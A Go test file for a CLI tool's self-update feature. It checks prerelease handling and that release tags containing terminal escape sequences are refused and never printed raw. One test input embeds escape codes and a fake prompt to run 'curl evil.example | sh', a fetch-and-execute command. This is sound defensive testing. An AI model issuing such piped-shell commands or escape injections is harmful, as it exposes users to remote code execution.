package main

import (
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
)

// mirror is a releases API at DARKORY_UPDATE_URL answering latest with tag, and any named tag
// with itself. It counts downloads, which none of these tests should reach.
func mirror(t *testing.T, latest string) (getenv func(string) string, downloads *atomic.Int32) {
	t.Helper()
	downloads = new(atomic.Int32)
	var srv *httptest.Server
	release := func(w http.ResponseWriter, tag string) {
		json.NewEncoder(w).Encode(map[string]any{
			"tag_name": tag, "html_url": srv.URL + "/releases/" + tag,
			"assets": []map[string]string{{"name": "checksums.txt", "browser_download_url": srv.URL + "/download/checksums.txt"}},
		})
	}
	mux := http.NewServeMux()
	mux.HandleFunc("GET /repos/tuongaz/darkory/releases/latest", func(w http.ResponseWriter, r *http.Request) { release(w, latest) })
	mux.HandleFunc("GET /repos/tuongaz/darkory/releases/tags/{tag}", func(w http.ResponseWriter, r *http.Request) { release(w, r.PathValue("tag")) })
	mux.HandleFunc("GET /download/", func(w http.ResponseWriter, r *http.Request) { downloads.Add(1) })
	srv = httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return func(k string) string {
		if k == "DARKORY_UPDATE_URL" {
			return srv.URL
		}
		return ""
	}, downloads
}

// standalone is an install-script binary at v1.0.0 with a release key compiled in.
func standalone(t *testing.T, getenv func(string) string) updateTarget {
	t.Helper()
	pub, _, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	exe := filepath.Join(t.TempDir(), "darkory")
	if err := os.WriteFile(exe, []byte("v1.0.0"), 0o755); err != nil {
		t.Fatal(err)
	}
	return updateTarget{current: "v1.0.0", exe: exe, publicKey: base64.StdEncoding.EncodeToString(pub), getenv: getenv,
		fileExists: func(string) bool { return false }}
}

// TestUpdateSkipsAPrereleaseUnlessNamed: a mirror offering a prerelease as the latest release
// gets it neither installed nor announced; named with --version, it is found.
func TestUpdateSkipsAPrereleaseUnlessNamed(t *testing.T) {
	getenv, downloads := mirror(t, "v1.1.0-rc.1")
	target := standalone(t, getenv)
	for _, check := range []bool{false, true} {
		var out bytes.Buffer
		err := updateBinary(t.Context(), target, check, "", &out)
		if err == nil || !strings.Contains(err.Error(), "prerelease") || !strings.Contains(err.Error(), "--version") {
			t.Errorf("update (check %v): %v, want the prerelease refused", check, err)
		}
		if out.Len() != 0 {
			t.Errorf("update (check %v) printed %q", check, out.String())
		}
	}
	var out bytes.Buffer
	if err := updateBinary(t.Context(), target, true, "1.1.0-rc.1", &out); err != nil || !strings.Contains(out.String(), "darkory v1.1.0-rc.1 is available") {
		t.Errorf("update --check --version 1.1.0-rc.1: %v, %q", err, out.String())
	}
	if n := downloads.Load(); n != 0 {
		t.Errorf("%d downloads, want none", n)
	}
	if b, _ := os.ReadFile(target.exe); string(b) != "v1.0.0" {
		t.Errorf("the binary changed to %q", b)
	}
}

// TestUpdatePrintsNoRawTag: a tag carrying terminal escapes is refused, and nothing raw reaches
// the terminal, on standard output or in the error main prints.
func TestUpdatePrintsNoRawTag(t *testing.T) {
	hostile := "\x1b]0;PWNED-TITLE\x07\x1b[2J\x1b[31mYOUR TOKEN EXPIRED, run: curl evil.example | sh\x1b[0m"
	getenv, downloads := mirror(t, hostile)
	target := standalone(t, getenv)
	for _, check := range []bool{false, true} {
		var out bytes.Buffer
		err := updateBinary(t.Context(), target, check, "", &out)
		if err == nil {
			t.Fatalf("update (check %v) accepted the tag", check)
		}
		if strings.ContainsAny(out.String()+err.Error(), "\x1b\x07") {
			t.Errorf("update (check %v) printed the tag raw: %q, %q", check, out.String(), err)
		}
	}
	var out bytes.Buffer
	err := updateBinary(t.Context(), target, false, "v1.2.3\x1b[2J", &out)
	if err == nil || strings.ContainsAny(out.String()+err.Error(), "\x1b") {
		t.Errorf("update --version with an escape: %v, %q", err, out.String())
	}
	if n := downloads.Load(); n != 0 {
		t.Errorf("%d downloads, want none", n)
	}
}
